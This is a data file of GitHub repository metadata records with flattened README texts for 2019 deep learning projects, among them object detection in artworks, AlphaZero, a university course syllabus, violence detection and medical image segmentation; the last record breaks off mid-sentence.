XabierGA,DNN_Julia,n/a,DNNJulia,2019-08-29T19:16:09Z,2019-12-08T10:41:21Z,Julia,XabierGA,User,3,4,1,4,master,XabierGA,1,0,0,0,1,0,0
mhaut,hyperspectral_deeplearning_review,deeplearning#hyperspectral#hyperspectral-image-classification,Deep Learning Classifiers for Hyperspectral Imaging A Review The Code for Deep Learning Classifiers for Hyperspectral Imaging A Review M E Paoletti J M Haut J Plaza and A Plaza Deep Learning Classifiers for Hyperspectral Imaging A Review International Society for Photogrammetry and Remote Sensing accepted for publication 2019 Source Code of paper Comming soon,2019-09-07T19:10:35Z,2019-11-27T06:58:00Z,Python,mhaut,User,1,4,1,5,master,mhaut,1,0,0,0,0,0,0
nicaogr,Mi_max,n/a,MImax Multi Instance Perceptron for weakly supervised transfer learning of deep detector Weakly Supervised Object Detection in Artworks https arxiv org abs 1810 02569 By Gonhier Nicolas https perso telecom paristech fr gonthier Gousseau Yann https perso telecom paristech fr gousseau Ladjal Said https perso telecom paristech fr ladjal and Bonfait Olivier http tristan u bourgogne fr CGC chercheurs Bonfait OlivierBonfait html This is a Tensorflow implementation of our Mimax model This code can be used to reproduce results on IconArt https wsoda telecom paristech fr downloads dataset Watercolor2k https github com naoto0804 cross domain detection and PeopleArt https github com BathVisArtData PeopleArt datasets Installation 1 Clone the repository Shell git clone git github com nicaogr Mimax git 2 You need to install all the required python library such as tensorflow cython opencv python numpy cythonbbox and easydict We advice you to create a conda environnement https docs conda io projects conda en latest user guide tasks manage environments html or equivalent You can use the requirements txt file and then install cythonbbox https pypi org project cython bbox Shell pip install r requirements txt pip install cythonbbox If you don t have the admin right try Shell pip install user r requirements txt pip install user cythonbbox In the requirements file we install the GPU version of Tensorflow 3 Update your arch in setup script to match your GPU for the faster RCNN code This code is a modify version of the Xinlei Chen https github com endernewton implementation https github com endernewton tf faster rcnn Shell cd tffasterrcnn lib Change the GPU architecture arch if necessary vim setup py GPU model Architecture TitanX Maxwell Pascal sm52 GTX 960M sm50 GTX 1080 Ti sm61 Grid K520 AWS g2 2xlarge sm30 Tesla K80 AWS p2 xlarge sm37 Note You are welcome to contribute the settings on your end if you have made the code work properly on other GPUs Also even if you are only using CPU tensorflow GPU based code for NMS will be used by default so please set USEGPUNMS False to get the correct output 4 Build the Cython modules If it is not already the case move to the lib folder Shell cd tffasterrcnn lib make clean make cd This code have been tested on Ubuntu 18 04 and 16 04 with python 3 6 and Tensorflow 1 8 Download the pre trained models You have to download the pre trained models through the link below and saved them to the model folder after decompressed it Google drive here https drive google com open id 0B1fAEgxdnvJSmF3YUlZcHFqWTQ Here the matching between the network and training set and the ckpt weights file name the last one is the one used by default in our code and our research paper vgg16VOC07 vgg16fasterrcnniter70000 ckpt vgg16VOC12 vgg16fasterrcnniter110000 ckpt vgg16COCO vgg16fasterrcnniter1190000 ckpt res101VOC07 res101fasterrcnniter70000 ckpt res101VOC12 res101fasterrcnniter110000 ckpt res101COCO res101fasterrcnniter1190000 ckpt res152COCO res152fasterrcnniter1190000 ckpt You may need to download the images datasets even if the You have to unzip the dataset in the data folder IconArt https wsoda telecom paristech fr downloads dataset IconArtv1 zip PeopleArt https codeload github com BathVisArtData PeopleArt zip master with the image level labels https wsoda telecom paristech fr downloads dataset PeopleArt csv Watercolor2k http www hal t u tokyo ac jp inoue projects crossdomaindetection datasets watercolor zip with the image level labels https wsoda telecom paristech fr downloads dataset watercolor csv Description of the pipeline We will first download the required dataset compute the features and boxes from a Faster RCNN recorded in a tfrecords file and then train a MImax model before runnning the detection evaluation The precomputation may require several dozen of GB You can add your own dataset it only required to be in the PASCAL VOC format To run the experiment from our research paper For the MImax model Shell python RunMImax py dataset IconArtv1 withscore For the MImax C model the dataset is split in 2 and several different values for C are used Shell python RunMImax py dataset IconArtv1 withscore CVMode CV CSearching In the RunMImax py you can find other parameters of the model that you can change such as the learning rate LR the regularization term C the loss or hinge the number of restarts etc Remark The training part of the MImax is trained in around 6 minutes on a good consumer GPU but we are sure that it is possible to speed it up Don t hesitate to contact us if you have any question or remarks about our code and our work Citation Please consider citing articleGonthier18 author Gonthier N and Gousseau Y and Ladjal S and Bonfait O title Weakly Supervised Object Detection in Artworks booktitle Computer Vision ECCV 2018 Workshops year 2018 publisher Springer International Publishing pages 692 709,2019-08-07T15:15:22Z,2019-12-05T07:39:21Z,Python,nicaogr,User,1,4,1,17,master,nicaogr,1,0,0,0,0,1,0
ethereon,alchemy,n/a,Alchemy A collection of deep learning models implemented using Merlin https github com ethereon merlin This is a perpetual work in progress Contents DeepLab v3 for semantic segmentation alchemy models deeplab The Xception architecture alchemy networks xception,2019-08-14T23:21:35Z,2019-11-05T07:35:50Z,Python,ethereon,User,1,4,0,9,master,ethereon,1,0,0,0,0,0,0
xeliot,pytorch_training,n/a,Pytorch Training Material Linear Regression Deep Neural Networks Convolutional Neural Networks Cifar10 example Recurrent Neural Networks RNNs LSTMs Transformers Bert Reinforcement Learning refer to https github com xeliot rlgym Deep Q Learning Policy Gradient Advantage Actor Critic Deep deterministic policy gradients by Dave Ho,2019-08-26T18:56:52Z,2019-09-09T16:22:53Z,Jupyter Notebook,xeliot,User,1,4,0,3,master,xeliot,1,0,0,0,0,0,0
markshih91,video_keyframe_extraction,n/a,videokeyframeextraction Video Key Frame Extraction Using Local Descriptors Based on Deep Learning Method Superpoint Features 1 Input must be camera or mp4 Video file 2 Real time display of extraction result 3 Various parameters can be adjusted according to specific requirement 4 20 FPS on GTX1060,2019-08-13T03:34:07Z,2019-12-04T02:05:51Z,Python,markshih91,User,1,4,0,6,master,markshih91,1,0,0,0,0,0,0
petosa,multiplayer-alphazero,alphazero#deep-reinforcement-learning#neurips-2019#pytorch,Journal Article https arxiv org abs 1910 13012 What is this An independent implementation of DeepMind s AlphaZero algorithm with support for multiplayer games AlphaZero is a deep reinforcement learning algorithm which can learn to master a certain class of adversarial games through self play Strategies are learned tabula rasa and with enough time and computation achieve super human performance The canonical AlphaZero algorithm is intended for 2 player games like Chess and Go though this project supports multiplayer games as well Benefits Clean Simple Clear and concise a no frills AlphaZero implementation written with Python 3 and PyTorch Extensively commented and easy to extend Support for CPU and GPU training as well as pausing and resuming training Modular Extensible Easily plug in your own games or neural networks by implementing the Game and Model interface Only PyTorch models are supported Example games and networks included with this repo are listed below Example Games Tic Tac Toe Tic Tac Mo Connect 3x3 Example Networks SENet Novel Multiplayer Support The first of its kind support for games with more than 2 players Tutorial Training an agent You can start training your own AlphaZero agents very easily python main py configs myrunconfiguration json You must run main py with the location of a run configuration json file as the first argument,2019-09-09T01:38:46Z,2019-12-15T03:21:24Z,Python,petosa,User,1,4,1,2,master,petosa,1,0,0,0,0,0,0
sergulaydore,EE-628-Fall-2019,n/a,Deep Learning EE 628 Electrical and Computer Engineering Fall 2019 at Stevens Institute of Technology Meeting Times Thursdays at 3 30pm 6pm Classroom Location Main Campus ABS 301 Instructor Assistant Prof Sergul Aydore Contact Info Burchard Building 211 saydore stevens edu Teaching Assistant Tianhao Zhu tzhu12 stevens edu Office Hours Sergul Aydore Burchard Building 211 Thursdays at 1 00pm 3 00pm Tianhao Zhu Burchard Building 315 Wednesday at 1 00pm 3 00pm Course Web Address https github com sergulaydore EE 628 Fall 2019 Cross listed with Data Acquisition Proc II COURSE DESCRIPTION This course presents a solid grasp of the practical techniques of deep learning The course formally introduces intution and ideas to successfully apply deep learning Although deep learning requires both mathematics and programming we will prioritize intution over mathematical rigor However we will assume that the students are familiar with the basics of statistics linear algebra and Python programming We will relate all concepts to a practical end STUDENT LEARNING OUTCOMES After successful completion of this course students will be able to how to cast a problem that can be solved with deep learning the mathematics of modeling algorithms for fitting models to data engineering techniques to implement it all FORMAT AND STRUCTURE The classes will include dynamic illustrations of the concepts Students are expected to bring their laptops and run the programs in their own laptops There will be weekly coding or handwritten assignments The students will return coding assignments via github COURSE MATERIALS Textbook s Dive into Deep Learning by A Zhang Z Lipton M Lu A Smola https www d2l ai index html Other Materials http cs231n stanford edu https people csail mit edu madry 6 883 Materials Canvas will be used for sharing assignment links and grades COURSE REQUIREMENTS Attendance Attendance is crucial for an effective learning but will not be graded Homework All assignments will be submitted via github Project Students are expected to finish a project that is documented in their github repository Exams There will be hand written mid term exam GRADING PROCEDURES Grades will be based on Assignments 30 Mid term Exam 30 Team Projects 40 Late Policy Assignments submitted after the deadline will not be graded IMPORTANT DATES Midterm exam 10 17 2019 Thursday at 3 30pm Deadline for Project Proposals 11 01 2019 Friday at 5pm ET This includes creation of a github repository with READ md file that contains the summary of the project Late submissions or repositories with empty READ md file will lose 30 points from their grade for the project Deadline for Projects 12 02 2019 Monday at 5pm ET Projects will be graded based on project report with at least 6 pages using the style file https courses d2l ai berkeley stat 157 media latex zip 40 project presentation on 12 05 2019 class time 40 organization of the github page 20 ACADEMIC INTEGRITY Graduate Student Code of Academic Integrity All Stevens graduate students promise to be fully truthful and avoid dishonesty fraud misrepresentation and deceit of any type in relation to their academic work A students submission of work for academic credit indicates that the work is the student s own All outside assistance must be acknowledged Any student who violates this code or who knowingly assists another student in violating this code shall be subject to discipline All graduate students are bound to the Graduate Student Code of Academic Integrity by enrollment in graduate coursework at Stevens It is the responsibility of each graduate student to understand and adhere to the Graduate Student Code of Academic Integrity More information including types of violations the process for handling perceived violations and types of sanctions can be found at www stevens edu provost graduate academics Special Provisions for Undergraduate Students in 500 level Courses The general provisions of the Stevens Honor System do not apply fully to graduate courses 500 level or otherwise Any student who wishes to report an undergraduate for a violation in a 500 level course shall submit the report to the Honor Board following the protocol for undergraduate courses and an investigation will be conducted following the same process for an appeal on false accusation described in Section 8 04 of the Bylaws of the Honor System Any student who wishes to report a graduate student may submit the report to the Dean of Graduate Academics or to the Honor Board who will refer the report to the Dean The Honor Board Chairman will give the Dean of Graduate Academics weekly updates on the progress of any casework relating to 500 level courses For more information about the scope penalties and procedures pertaining to undergraduate students in 500 level courses see Section 9 of the Bylaws of the Honor System document located on the Honor Board website EXAM ROOM CONDITIONS The following procedures apply to quizzes and exams for this course As the instructor I reserve the right to modify any conditions set forth below by printing revised Exam Room Conditions on the quiz or exam 1 Students are not permitted to use any electronic devices or text books during quizzes and or exams 2 Students are are not allowed to work with or talk to other students during quizzes and or exams LEARNING ACCOMODATIONS Stevens Institute of Technology is dedicated to providing appropriate accommodations to students with documented disabilities The Office of Disability Services ODS works with undergraduate and graduate students with learning disabilities attention deficit hyperactivity disorders physical disabilities sensory impairments psychiatric disorders and other such disabilities in order to help students achieve their academic and personal potential They facilitate equal access to the educational programs and opportunities offered at Stevens and coordinate reasonable accommodations for eligible students These services are designed to encourage independence and self advocacy with support from the ODS staff The ODS staff will facilitate the provision of accommodations on a case by case basis Disability Services Confidentiality Policy Student Disability Files are kept separate from academic files and are stored in a secure location within the Office of Disability Services The Family Educational Rights Privacy Act FERPA 20 U S C 1232g 34CFR Part 99 regulates disclosure of disability documentation and records maintained by Stevens Disability Services According to this act prior written consent by the student is required before our Disability Services office may release disability documentation or records to anyone An exception is made in unusual circumstances such as the case of health and safety emergencies For more information about Disability Services and the process to receive accommodations visit https www stevens edu office disability services If you have any questions please contact Phillip Gehman the Director of Disability Services Coordinator at Stevens Institute of Technology at pgehman stevens edu or by phone 201 216 3748 INCLUSIVITY Name and Pronoun Usage As this course includes group work and in class discussion it is vitally important for us to create an educational environment of inclusion and mutual respect This includes the ability for all students to have their chosen gender pronoun s and chosen name affirmed If the class roster does not align with your name and or pronouns please inform the instructor of the necessary changes Inclusion Statement Stevens Institute of Technology believes that diversity and inclusiveness are essential to excellence in academic discourse and innovation In this class the perspective of people of all races ethnicities gender expressions and gender identities religions sexual orientations disabilities socioeconomic backgrounds and nationalities will be respected and viewed as a resource and benefit throughout the semester Suggestions to further diversify class materials and assignments are encouraged If any course meetings conflict with your religious events please do not hesitate to reach out to your instructor to make alternative arrangements You are expected to treat your instructor and all other participants in the course with courtesy and respect Disrespectful conduct and harassing statements will not be tolerated and may result in disciplinary actions MENTAL HEALTH RESOURCES Part of being successful in the classroom involves a focus on your whole self including your mental health While you are at Stevens there are many resources to promote and support mental health The Office of Counseling and Psychological Services CAPS offers free and confidential services to all enrolled students who are struggling to cope with personal issues e g difficulty adjusting to college or trouble managing stress or psychological difficulties e g anxiety and depression Appointments are strongly encouraged and can be made by phone 201 216 5177 or in person on the 7th floor of the Howe Center CAPS is open from 9 00 am 5 00 pm Mondays Wednesdays Thursdays and Fridays and from 9 00 am 7 00 pm on Tuesdays during the Fall and Spring semesters EMERGENCY INFORMATION In the event of an urgent or emergent concern about the safety of yourself or someone else in the Stevens community please immediately call the Stevens Campus Police at 201 216 5105 or on their emergency line at 201 216 3911 These phone lines are staffed 24 7 year round Other 24 7 resources for students dealing with mental health crises include the National Suicide Prevention Lifeline 1 800 273 8255 and the Crisis Text Line text Home to 741 741 If you are concerned about the wellbeing of another Stevens student and the matter is not urgent or time sensitive please email the CARE Team at care stevens edu A member of the CARE Team will respond to your concern as soon as possible,2019-08-29T00:03:36Z,2019-11-21T17:40:17Z,Jupyter Notebook,sergulaydore,User,3,4,1,31,master,sergulaydore#Timbasa,2,0,0,0,0,0,0
usmanumar2010,Auto-Cropping,n/a,Auto Cropping Image Background Removal using Deep Learning Background removal is a task that is quite easy to do manually or semi manually Photoshop and even Power Point has such tools if you use some kind of a marker and edge detection However fully automated background removal is quite a challenging task So i was quite inspired by this idea https towardsdatascience com background removal with deep learning c4f2104b3157 So I thought to work with this in a Secure and private AI project showcase challenge I used several techniques to perform segmentation but with Mask RCNN https github com matterport MaskRCNN pretrained model I was not able to get a proper segementation Finally i studied about DeepLab https github com tensorflow models tree master research deeplab is a state of art deep learning model for semantic image segmentaion it help me achieving my desired results for Demo I used pretrined model for this project xceptioncocovoctrainaug on COCO dataset How To run Script Crop py arguments imagepath backgroundpath Example python Crop py imagepath home usman Desktop 193631416903349212055543960288358644789045n jpg backgroundpath home usman Desktop pexels photo 949587 jpeg Explanation imagepath path to the image which need to be cropped backgroundpath path to the background that you need to paste your cropped image on Visual Example Path to input image and the background image In the following directories you can see your cropped image and the pasted image on a background croppedimage directory pastedimage directory Helping material Material that helped me and will help me in the future https arxiv org abs 1606 00915 https arxiv org abs 1505 04597 https arxiv org abs 1703 03872 https arxiv org abs 1703 06870 https www fast ai https medium com nanonets how to do image segmentation using deep learning c673cc5862ef https medium com fnplus blue or green screen effect with open cv chroma keying 94d4a6ab2743 https towardsdatascience com background removal with deep learning c4f2104b3157,2019-08-19T12:58:59Z,2019-08-26T14:08:53Z,Python,usmanumar2010,User,1,4,0,10,master,usmanumar2010,1,0,0,0,0,0,0
hasnainnaeem,Violence-Detection-in-Videos,n/a,Violence Detection by CNN LSTM This repo is extension of Joshua s project https github com JoshuaPiinRueyPan ViolenceDetection Some additions made to project are Real time Predictions on Video Feed from Camera Main py file to demonstrate all the features of project Code modification to make it work on google colab Colab notebook is included in the repo To setup on colab upload zipped project file link will be shared soon on drive and run the code in colab notebook The proposed approach outperforms the state of the art methods while still processing the videos in real time The proposed model has the following advantages 1 The ability to use the pre trained model on ImageNet dataset 2 The ability to learn the local motion features by examined the concatenated two frames using CNN 3 The ability to learn the global temporal features by LSTM cell src net G2D19P2OFCNN1LSTMseries png For more information please refer to Joshua s article http joshua p r pan blogspot tw 2018 05 violence detection by cnn lstm html Requirement Python3 sk video scikit image TensorFlow 1 7 0 imgaug https github com aleju imgaug This pakage has already contained in src thirdparty Quick Start Training 1 Download the fight non fight dataset from here http visilab etsii uclm es personas oscar FightDetection index html or other fight non fight datasets is also supported as long as you separate the fight and non fight videos in the different directories 2 To make the data catelogs that will tell the data manager where to load the videos edit the file tools TrainValTestspliter py to specified the path to the dataset videos the ratio to split the datasets into training validation and test set And run such scripts you will get three data catelogs train txt val txt test txt 3 Edit the settings DataSettings py to specify where do you put the data catelogs Shell PATHTOTRAINSETCATELOG MyPathToDataCatelog train txt PATHTOVALSETCATELOG MyPathToDataCatelog val txt PATHTOTESTSETCATELOG MyPathToDataCatelog test txt 4 Edit the settings TrainSettings py and set the variables to fit your environment For example you may want to edit the following variables Shell MAXTRAININGEPOCH 30 EPOCHSTOSTARTSAVEMODEL 1 PATHTOSAVEMODEL MyPathToSaveTrainingResultsAndModels 5 By default it will use the G2D19P2OFResHB1LSTM as its default network This network is base on the pre trained Darknet19 The checkpoint of such model is converted from the Darknet https pjreddie com darknet imagenet format to the TensorFlow pb format by the use of Darkflow https github com thtrieu darkflow You can convert the checkpoint by yourself or download from here https drive google com open id 1oUPhXtZjTU04DOwAXv6LtQ1GxFG9TD7b Then move the file to data pretrainModels darknet19 or edit the variable DARKNET19MODELPATH in src net G2D19P2OFResHB1LSTM py src net G2D19P2OFResHB1LSTM py to the path that you put the checkpoint Note You can change the network by editting the settings NetSettings py Take a look at src net src net to see the various networks that are avaliable 6 You re ready to train the model Type the following command to train Shell python3 Train py or if you set the Train py to be executable just type Shell Train py Deploy After you have trained a model you can input a video and see its performance by following procedures 1 Edit the settings DeploySettings py to set the variables to fit your environment For example you may want to edit the following variables Shell PATHTOMODELCHECKPOINTS PathToMyBestModelCheckpoint 2 Execute the Violence Detector by the following command Shell Deploy py Path file name of the video to be tested or by the following command if you want to save the result Shell Deploy py Path file name of the video to be tested Path file name of the resulting video DeployLive After you have trained a model you can make real time predictions on camera feed 1 Edit the settings DeployLiveSettings py to set the variables to fit your environment For example you may want to edit the following variables Shell PATHTOMODELCHECKPOINTS PathToMyBestModelCheckpoint 2 Execute the Violence Detector by the following command Shell DeployLive py Architecture and Design Philosophy 1 This project has the following architecture Train py An executable that can train the violence detection models Deploy py An executable that can display a video and show if it has violence event per frame Evaluate py An executable that can calculate the accuracies with respect to the given dataset catelog and the model checkpoints settings A folder that contains various settings in this projects Most of the commonly changed variables can be found here I prefer this design philosophy because the user can easily change several variables without get into the source code Moreover to isolate the customized variables here this folder can be set as ignored by git if there re multiple developers to avoid the conflicts Although one can also use the tf app flags to avoid the conflicts between the developers I think it s kind of pain to enter so much arguments in the command line src Functions and Classes that used by the executables can be found here src data Libraries that deal with data src layers Convinient functions or wrappers for tensorflow Note The settings of layers such as weight decay layer initailization variables can be found in settings LayerSettings py src net The network blueprints can be found here You can find examples and design your own networks here Note Remember to change the new developed network by editting the settings NetSettings py src thirdparty Third party libraries are placed here Currently this folder only contains the data augmentation library imgaug https github com aleju imgaug,2019-09-01T23:52:54Z,2019-11-24T07:50:16Z,Python,hasnainnaeem,User,1,4,2,4,master,hasnainnaeem,1,0,0,0,0,0,0
joonnyong,Deep-Learning-based-Biosignal-Processing,n/a,Deep Learning based Biosignal Processing This repository was created for sharing the files necessary to partake in 2019 KOSOMBE Summer School of Biomedical Engineering Author Joonnyong Lee Biomedical Research Institute Seoul National University Hospital Date 2019 8 24 PPG1000samples zip text file RAEtensorboard zip recurrent autoencoder checkpoint BRAEtensorboard zip bidirectional recurrent autoencoder checkpoint AEpractice py autoencoder python RAEapply py recurrent autoencoder python RAEpracticesolution py recurrent autoencoder python externalval1 txt 5min of PPG recorded at 125Hz on the torso lots of noises externalval2 txt 5min of PPG recorded at 125Hz on the torso lots of noises,2019-08-20T08:18:11Z,2019-10-16T05:16:55Z,Python,joonnyong,User,3,3,2,27,master,joonnyong,1,0,0,0,0,0,0
rezacsedu,Deep-learning-for-clustering-in-bioinformatics,autoencoders#bioinformatics#clustering-analysis#convolutional-autoencoder#deep-learning#lstm-neural-networks#neural-networks#representation-learning#variational-autoencoder,Deep Learning based Clustering Approaches for Bioinformatics Codes and supplementary materials for our paper Deep Learning based Clustering Approaches for Bioinformatics has been accepted for publication in Briefings in Bioinformatics https academic oup com bib journal This repo will be updated periodically In particular more complete Jupyter notebooks will be added and new approaches paper will be listed In this article we reviewed deep learning based approaches for cluster analysis including network training representation learning parameter optimization and formulating clustering quality metrics We also discussed how representation learning based on different autoencoder architectures e g vanilla variational LSTM and convolutional can be more effective than machine learning based approaches e g PCA in different scenarios e g bio imaging gene expression clustering and clustering biomedical texts The article is in the press and soon will be published online with open access Deep learning based unsupervised clustering methods link to papers and codes Title Article Conference Journal Code Deep clustering with convolutional autoencoders DCEC Link https xifengguo github io papers ICONIP17 DCEC pdf ICONIP 2017 GitHub https github com XifengGuo DCEC Unsupervised Data Augmentation for Consistency Training UDA Link https arxiv org pdf 1904 12848 pdf Arxiv 2019 GitHub https github com google research uda Deep Clustering via joint convolutional autoencoder embedding and relative entropy minimization DEPICT Link https arxiv org pdf 1704 06327 pdf ICCV 2017 GitHub https github com herandy DEPICT Discriminatively Boosted Clustering DBC Link https arxiv org pdf 1703 07980 pdf Arxiv 2017 N A Variational Deep Embedding VADE Link https arxiv org pdf 1611 05148 pdf IJCAI 2017 GitHub https github com slim1017 VaDE Convolutional Deep Embedding Clustering CDEC Link https arxiv org pdf 1805 12218 pdf Arxiv 2018 GitHub https github com rezacsedu Recurrent Deep Embedding Networks Deep Subspace Clustering Networks DSC Nets Link http papers nips cc paper 6608 deep subspace clustering networks pdf NIPS 2017 GitHub https github com panji1990 Deep subspace clustering networks Graph Clustering with Dynamic Embedding GRACE Link https arxiv org pdf 1712 08249 pdf Arxiv 2017 N A Deep Unsupervised Clustering Using Mixture of Autoencoders MIXAE Link https arxiv org pdf 1712 07788 pdf Arxiv 2017 N A Deep Embedded Clustering DEC Link http proceedings mlr press v48 xieb16 pdf ICML 2016 GitHub https github com piiswrong dec A Survey of Clustering With Deep Learning From the Perspective of Network Architecture Link https ieeexplore ieee org stamp stamp jsp arnumber 8412085 IEEE ACCESS 2018 GEMSEC Graph Embedding with Self Clustering Link https arxiv org pdf 1802 03997 pdf Arxiv 2018 GitHub https github com benedekrozemberczki GEMSEC Clustering with Deep Learning Taxonomy and New Methods Link https arxiv org pdf 1801 07648 pdf Arxiv 2018 GitHub https github com elieJalbout Clustering with Deep learning Deep Continuous Clustering DCC Link https arxiv org pdf 1803 01449 pdf Arxiv 2018 GitHub https github com shahsohil DCC Deep Clustering with Convolutional Autoencoders DCEC Link https xifengguo github io papers ICONIP17 DCEC pdf ICONIP 2018 GitHub https github com XifengGuo DCEC SpectralNet Spectral Clustering Using Deep Neural Networks Link https openreview net pdf id HJaoCyRZ ICLR 2018 GitHub https github com KlugerLab SpectralNet Subspace clustering using a low rank constrained autoencoder LRAE Link https www sciencedirect com science article pii S0020025517309659 Information Sciences 2018 N A Clustering driven Deep Embedding with Pairwise Constraints CPAC Link https arxiv org pdf 1803 08457 pdf Arxiv 2018 GitHub https github com sharonFogel CPAC Towards K means friendly Spaces Simultaneous Deep Learning and Clustering Link https arxiv org pdf 1610 04794 pdf PMLR 2017 N A Deep Unsupervised Clustering With Gaussian Mixture Variational AutoEncoders GMVAE Link https arxiv org pdf 1611 02648 pdf ICLR 2017 GitHub https github com Nat D GMVAE N A Is Simple Better Revisiting Simple Generative Models for Unsupervised Clustering Link https ic unicamp br adin downloads pubs AriasFigueroa2017a pdf NIPS 2017 Workshop GitHub https github com jariasf clustering nips 2017 Imporved Deep Embedding Clustering IDEC Link https www ijcai org proceedings 2017 0243 pdf IJCAI 2017 GitHub https github com XifengGuo IDEC Deep Clustering Network DCN Link https arxiv org pdf 1610 04794v1 pdf Arxiv 2016 GitHub https github com boyangumn DCN New N A Joint Unsupervised Learning of Deep Representations and Image Clustering JULE Link https arxiv org pdf 1604 03628 pdf CVPR 2016 GitHub https github com jwyang JULE torch Deep Embedding Network for Clustering DEN Link https ieeexplore ieee org document 6976982 ICPR 2014 N A Auto encoder Based Data Clustering ABDC Link http nlpr web ia ac cn english irds People lwang M MCGEN Publications 2013 CFS2013CIARP pdf CIARP 2013 GitHub https github com KellerJordan Autoencoder Clustering Learning Deep Representations for Graph Clustering Link https www aaai org ocs index php AAAI AAAI14 paper viewFile 8527 8571 AAAI 2014 GitHub https github com quinngroup deep representations clustering Running provided Jupyter notebooks To run the examples interactively you need to install some Python modules and libraries Python 3 Scikit learn Keras TensorFlow For the Jupyter notebook git it from this Link https jupyter readthedocs io en latest install html and install it on your machine Then clone this repo using following command given that you have already installed the git git clone https github com rezacsedu Deep learning for clustering in bioinformatics git Alternatively install all the required libraries by issuing the following command cd Deep learning for clustering in bioinformatics pip3 install r requirements txt cd Notebboks Then start Jupyter notebbok by issuing the following command jupyter notebook In the opened browser go to Jupyter tab and window open the notebook LSTMAETextClustering ipynb If you want to skip the training soon we ll provide the pre trained weights which you can restore and start fine tuning Happy coding Leave a comment if you have any question Acknowledgement The ClusteringLayer class and the targetdistribution function are based on DEC from https github com XifengGuo DCEC blob master DCEC py by Xifeng Guo Citation request If you use the code of this repository in your research please consider citing the folowing papers inproceedingskarimBIB2020 title Deep Learning based Clustering Approaches for Bioinformatics author Md Rezaul Karim Oya Beyan Achille Zappa Ivan G Costa Dietrich Rebholz Schuhmann Michael Cochez and Stefan Decker journal Briefings in Bioinformatics year 2020 Contributing If you find more related work which are not listed here please create a PR or sugest by filing issues Your contribution will be highly appreciated For any questions feel free to open an issue or contact at rezaul karim rwth aachen de,2019-08-16T21:36:19Z,2019-12-14T11:48:40Z,Jupyter Notebook,rezacsedu,User,1,3,2,45,master,rezacsedu,1,0,0,0,0,0,0
faruknane,DeepLearningFramework,csharp#deeplearning#matrix#netcore,DeepLearningFramework Every expression is a term whose derivative can be calculated by the DeepLearningFramework automatically Every Layer is consist of Terms which corresponds to sequential input An example of XOR model is shown below Hyperparameters Global independent from model csharp Hyperparameters LearningRate 0 2f Hyperparameters Optimizer new SGD Inputs Arguments of Model csharp var x new Input 2 var y new Input 1 Creating a Model csharp var l1 Layer Dense 2 x sigmoid var model Layer Dense 1 l1 sigmoid The loss error function csharp var loss Layer SquaredError model y Training Process Very simple If you manually assign inputs Dot Minimize or Maximize whichever you want to use csharp for int epoch 0 epoch 1000 epoch x SetSequenceLength 1 y SetSequenceLength 1 x SetInput 0 new float 2 4 1 1 0 0 1 0 1 0 y SetInput 0 new float 1 4 0 1 1 0 loss Minimize Console WriteLine loss loss GetTerm 0 GetResult 0 Print Results csharp loss DeleteTerms var result model GetTerm 0 GetResult Console WriteLine Results result 0 result 1 result 2 result 3 Recurrent Layers csharp var l1 new Recurrent 1 x Layer h Layer x return h x csharp var l1 new Recurrent 10 x Layer h Layer x var WH new Variable h D1 h D1 x SequenceLength setzero true return WH h Layer Dense h D1 x To support me My Patreon https www patreon com afaruknane,2019-08-31T21:40:21Z,2019-10-14T12:58:23Z,C#,faruknane,User,1,3,0,36,master,faruknane,1,0,0,0,0,0,0
asmaamirkhan,DeepLearningNotes,convolutional-neural-networks#deep-learning#deep-learning-visualization#keras#neural-networks#neural-networks-visualization#tensorflow,description My notes and codes on deep learning Deep Learning Notes Table of Contents Title 0 Theoric Concepts of Neural Networks 0 NNConcepts 1 Hello World of Deep Learning With Neural Networks 1 HelloWorld 2 Introduction to Computer Vision 2 Intro2ComputerVision 3 Theoric Concepts of Convolutional Neural Networks 3 CNNConcepts 4 Works on Convolutional Neural Networks 4 CNNWorks 5 Deep Learning Strategies 5 DLStrategies 6 Image Augmentation 6 ImageAugmentation 7 Applied Machine Learning 7 AppliedML 8 Object Detection 8 ObjectDetection 9 Sequence Models 9 SequenceModels Extensions Title 0 PDFs that I found and recommend Z UsefulPDFs README md 1 Visual materials for quick info Z QuickVisualInfo Other Version Turkish version of this project is here https dltr asmaamir com Quote Your learning algorithm has two main sources of knowledge one is the data and other is whatever you hand design Please Help me to improve and to increase the content by opening a pull request Tell me your suggestions by sending me an email mailto asmaamirkhan am gmail com or opening an issue Contact Find me on LinkedIn https www linkedin com in asmaamirkhan and feel free to mail me Asmaa mailto asmaamirkhan am gmail com,2019-08-08T07:30:43Z,2019-12-14T21:21:42Z,Jupyter Notebook,asmaamirkhan,User,1,3,0,237,master,asmaamirkhan#yedhrab,2,0,0,0,0,0,2
ravi4all,DeepLearning_AugWE_19,n/a,,2019-08-18T11:25:12Z,2019-11-30T10:14:36Z,Jupyter Notebook,ravi4all,User,1,3,0,20,master,ravi4all,1,0,0,0,0,0,0
DCI-NET,segmed,n/a,SegMed Build Status https travis ci org DCI NET segmed svg branch master https travis ci org DCI NET segmed This is a collection of Deep Learning semantic segmentation models to use for specific tasks namely medical images cells histological data and related Models The models here presented are just two namely the U Net https arxiv org pdf 1505 04597 pdf and the MultiResUNet https arxiv org pdf 1902 04049 pdf These models have been a very good application of Fully Convolutional Networks to the medical image segmentation task and are very well suited for it Implementation Everything is implemented with TensorFlow 2 0 tensorflow org using the newly acquired Keras API within TensorFlow This allows for the flexibility and completeness of using the full TensorFlow library while still having very good scripting capabilities with Keras Dependencies There are several ways to install this package Using pip The easiest way to install this package is using pip with the following command pip install segmed although it is highly encouraged to do this inside a virtual environment If using Colaboratory https colab research google com notebooks welcome ipynb then this is the preferred way to use the package IMPORTANT When using Colaboratory one must always install TensorFlow 2 0 first and then install segmed i e this package using the following commands in a cell within a Colaboratory notebook pip install upgrade pip pip install segmed pip install upgrade tensorflow Using poetry poetry https poetry eustace io is supported by following the installation https poetry eustace io docs installation instructions to get poetry installed the following command should install segmed in a virtual environment shell clone the repository git clone https github com DCI NET segmed run poetry and install poetry install poetry is a next gen dependecy manager and makes everything a lot easier Using conda This package also comes with a conda environment https docs conda io projects conda en latest user guide tasks manage environments html for those that use the Anaconda distribution https www anaconda com distribution To install the environment make sure you have conda https conda io en latest installed then run the following conda env create f segmedenv yml this should ask you to confirm the installation say yes and proceed with the installation After that activate the newly created environment conda activate segmed and now you are ready to run the code within this repository Unit tests This repository has some unit tests available that should be running constantly in the background and the status of the current code build is displayed in the badge above the one right to the title One can manually run the tests too You can download this repository with git like so git clone https github com DCI NET segmed git Then you install pytest https pytest org en latest and just run the following command pytest and the test suite should start running with a few import and API warnings but everything should pass if the badge above says passing in green Examples This repository also has some very barebones examples of how to use these models However they were run 